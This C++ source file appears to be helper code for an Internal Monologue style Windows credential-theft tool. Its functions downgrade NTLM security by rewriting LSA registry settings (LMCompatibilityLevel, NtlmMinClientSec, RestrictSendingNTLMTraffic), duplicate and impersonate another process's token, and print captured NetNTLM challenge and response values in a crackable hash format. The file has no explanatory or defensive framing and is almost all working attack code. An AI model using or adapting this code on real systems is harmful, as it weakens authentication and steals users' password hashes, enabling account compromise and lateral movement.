#define CheckStatus(value, fname) {if (value != SEC_E_OK && value != SEC_I_CONTINUE_NEEDED) { throw std::runtime_error("Error");}}
#define valloc(size) VirtualAlloc(NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)
#define vfree(addr) VirtualFree(addr, 0, MEM_RELEASE)
#define ferror(msg) {std::wcout << L"[-] Function " << msg << L" failed" << std::endl;}


class InternalMonologueResponse {
public:
	std::wstring Challenge = L"";
	std::wstring Resp1 = L"";
	std::wstring Resp2 = L"";
	std::wstring Domain = L"";
	std::wstring UserName = L"";
	std::wstring UsernameWithoutDomain = L"";
	void Print() {
		std::wcout << UsernameWithoutDomain << L"::" << Domain << L":" << Resp1 << L":" << Resp2 << L":" << Challenge << std::endl;
	}
};

std::vector<uint8_t> StringToByteArray(LPCWSTR hex) {
	std::wstring hexStr(hex);
	size_t length = hexStr.length();

	if (length % 2 == 1) {
		return std::vector<uint8_t>();
	}

	std::vector<uint8_t> arr(length >> 1);

	for (size_t i = 0; i < length >> 1; ++i) {
		uint8_t msb = (hexStr[i << 1] >= '0' && hexStr[i << 1] <= '9') ? hexStr[i << 1] - '0' : std::toupper(hexStr[i << 1]) - 'A' + 10;
		uint8_t lsb = (hexStr[(i << 1) + 1] >= '0' && hexStr[(i << 1) + 1] <= '9') ? hexStr[(i << 1) + 1] - '0' : std::toupper(hexStr[(i << 1) + 1]) - 'A' + 10;

		arr[i] = (msb << 4) + lsb;
	}

	return arr;
}


LPCWSTR GetUserSid()
{
	HANDLE hToken;
	TOKEN_USER* pTokenUser;
	DWORD dwLength;
	LPWSTR lpStringSid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{

		return nullptr;
	}

	if (!GetTokenInformation(hToken, TokenUser, nullptr, 0, &dwLength) && (GetLastError() != ERROR_INSUFFICIENT_BUFFER))
	{
		CloseHandle(hToken);
		return nullptr;
	}

	pTokenUser = reinterpret_cast<TOKEN_USER*>(new BYTE[dwLength]);

	if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwLength, &dwLength))
	{
		CloseHandle(hToken);
		delete[] reinterpret_cast<BYTE*>(pTokenUser);
		return nullptr;
	}

	if (!ConvertSidToStringSidW(pTokenUser->User.Sid, &lpStringSid))
	{
		CloseHandle(hToken);
		delete[] reinterpret_cast<BYTE*>(pTokenUser);
		return nullptr;
	}

	CloseHandle(hToken);
	delete[] reinterpret_cast<BYTE*>(pTokenUser);

	return lpStringSid;
}

LPWSTR GetCurrentUsername() {
	HANDLE hToken;
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_READ,FALSE, &hToken)) {
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_READ, &hToken))
			return (LPWSTR)L"";
	}

	DWORD bufferSize = 0;
	if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &bufferSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
		CloseHandle(hToken);
		return (LPWSTR)L"";
	}

	PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(bufferSize);
	if (!pTokenUser) {
		CloseHandle(hToken);
		return (LPWSTR)L"";
	}

	if (!GetTokenInformation(hToken, TokenUser, pTokenUser, bufferSize, &bufferSize)) {
		free(pTokenUser);
		CloseHandle(hToken);
		return (LPWSTR)L"";
	}

	WCHAR accountName[MAX_PATH];
	WCHAR domainName[MAX_PATH];
	DWORD accountNameSize = MAX_PATH;
	DWORD domainNameSize = MAX_PATH;
	SID_NAME_USE snu;

	if (!LookupAccountSidW(NULL, pTokenUser->User.Sid, accountName, &accountNameSize, domainName, &domainNameSize, &snu)) {
		free(pTokenUser);
		CloseHandle(hToken);
		return (LPWSTR)L"";
	}

	std::wstring username = std::wstring(domainName) + L"\\" + std::wstring(accountName);

	free(pTokenUser);
	CloseHandle(hToken);

	LPWSTR lpwstr = new WCHAR[username.length() + 1];
	wcscpy_s(lpwstr, username.length() + 1, username.c_str());
	return lpwstr;
}

std::vector<BYTE> GetSecBufferByteArray(const SecBufferDesc* pSecBufferDesc) {
	if (!pSecBufferDesc) {
		throw std::invalid_argument("SecBufferDesc pointer cannot be null");
	}

	std::vector<BYTE> buffer;

	if (pSecBufferDesc->cBuffers == 1) {
		SecBuffer* pSecBuffer = pSecBufferDesc->pBuffers;
		if (pSecBuffer->cbBuffer > 0 && pSecBuffer->pvBuffer) {
			buffer.resize(pSecBuffer->cbBuffer);
			memcpy(&buffer[0], pSecBuffer->pvBuffer, pSecBuffer->cbBuffer);
		}
	}
	else {
		size_t bytesToAllocate = 0;

		for (unsigned int i = 0; i < pSecBufferDesc->cBuffers; ++i) {
			bytesToAllocate += pSecBufferDesc->pBuffers[i].cbBuffer;
		}

		buffer.resize(bytesToAllocate);
		BYTE* pBufferIndex = &buffer[0];

		for (unsigned int i = 0; i < pSecBufferDesc->cBuffers; ++i) {
			SecBuffer* pSecBuffer = &(pSecBufferDesc->pBuffers[i]);
			if (pSecBuffer->cbBuffer > 0 && pSecBuffer->pvBuffer) {
				memcpy(pBufferIndex, pSecBuffer->pvBuffer, pSecBuffer->cbBuffer);
				pBufferIndex += pSecBuffer->cbBuffer;
			}
		}
	}

	return buffer;
}


std::wstring byteArrayToString(const std::vector<BYTE>& byteArray) {
	std::wstring result;
	result.reserve(byteArray.size() * 2);
	for (BYTE b : byteArray) {
		wchar_t buf[3];
		wsprintf(buf, L"%02X", b);
		result.append(buf);
	}

	return result;
}


std::wstring ConvertHex(const std::wstring& hexString) {
	std::wstring unicodeString;
	for (size_t i = 0; i < hexString.length(); i += 2) {
		std::wstring hs = hexString.substr(i, 2);
		if (hs == L"00") {
			continue;
		}

		uint32_t decval = 0;
		for (char c : hs) {
			if (c >= '0' && c <= '9') {
				decval = decval * 16 + (c - '0');
			}
			else if (c >= 'A' && c <= 'F') {
				decval = decval * 16 + (c - 'A' + 10);
			}
			else if (c >= 'a' && c <= 'f') {
				decval = decval * 16 + (c - 'a' + 10);
			}
		}

		wchar_t character = static_cast<wchar_t>(decval);
		unicodeString += character;
	}
	return unicodeString;
}

std::wstring SplitDomain(std::wstring inputString) {
	std::wstring username;

	size_t found = inputString.find_last_of(L"\\");
	if (found != std::wstring::npos) {
		username = inputString.substr(found + 1);
	}
	return username;
}

bool IsElevated() {
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		return false;
	}

	TOKEN_ELEVATION elevation;
	DWORD dwSize;
	if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
		CloseHandle(hToken);
		return false;
	}

	CloseHandle(hToken);
	return elevation.TokenIsElevated;
}

char* getCmdOption(char** begin, char** end, const std::string& option)
{
	char** itr = std::find(begin, end, option);
	if (itr != end && ++itr != end)
	{
		return *itr;
	}
	return 0;
}

bool cmdOptionExists(char** begin, char** end, const std::string& option)
{
	return std::find(begin, end, option) != end;
}

void GetRegKey(const std::wstring& subKey, const std::wstring& valueName, DWORD& outValue) {
	HKEY hKey;
	RegOpenKeyExW(HKEY_LOCAL_MACHINE, subKey.c_str(), 0, KEY_READ, &hKey);
	DWORD dataSize = sizeof(DWORD);
	RegQueryValueExW(hKey, valueName.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(&outValue), &dataSize);
	RegCloseKey(hKey);
}

void SetRegKey(const std::wstring& subKey, const std::wstring& valueName, DWORD value) {
	HKEY hKey;
	RegOpenKeyExW(HKEY_LOCAL_MACHINE, subKey.c_str(), 0, KEY_WRITE, &hKey);
	RegSetValueExW(hKey, valueName.c_str(), 0, REG_DWORD, reinterpret_cast<BYTE*>(&value), sizeof(value));
	RegCloseKey(hKey);
}

void ExtendedNTLMDowngrade(DWORD& oldValue_LMCompatibilityLevel, DWORD& oldValue_NtlmMinClientSec, DWORD& oldValue_RestrictSendingNTLMTraffic) {
	GetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa", L"LMCompatibilityLevel", oldValue_LMCompatibilityLevel);
	SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa", L"LMCompatibilityLevel", 2);

	GetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"NtlmMinClientSec", oldValue_NtlmMinClientSec);
	SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"NtlmMinClientSec", 536870912);

	GetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"RestrictSendingNTLMTraffic", oldValue_RestrictSendingNTLMTraffic);
	SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"RestrictSendingNTLMTraffic", 0);
}

void NTLMRestore(DWORD& oldValue_LMCompatibilityLevel, DWORD& oldValue_NtlmMinClientSec, DWORD& oldValue_RestrictSendingNTLMTraffic)
{
	SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa", L"LMCompatibilityLevel", oldValue_LMCompatibilityLevel);
	SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"NtlmMinClientSec", oldValue_NtlmMinClientSec);
	SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"RestrictSendingNTLMTraffic", oldValue_RestrictSendingNTLMTraffic);
}

DWORD ApplyProcessToken(DWORD pid) {
	ImpersonateSelf(SecurityDelegation);
	HANDLE procHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);

	HANDLE hSystemTokenHandle;
	OpenProcessToken(procHandle, TOKEN_DUPLICATE, &hSystemTokenHandle);

	HANDLE newTokenHandle;
	DuplicateTokenEx(hSystemTokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &newTokenHandle);

	ImpersonateLoggedOnUser(newTokenHandle);
	return GetLastError();
}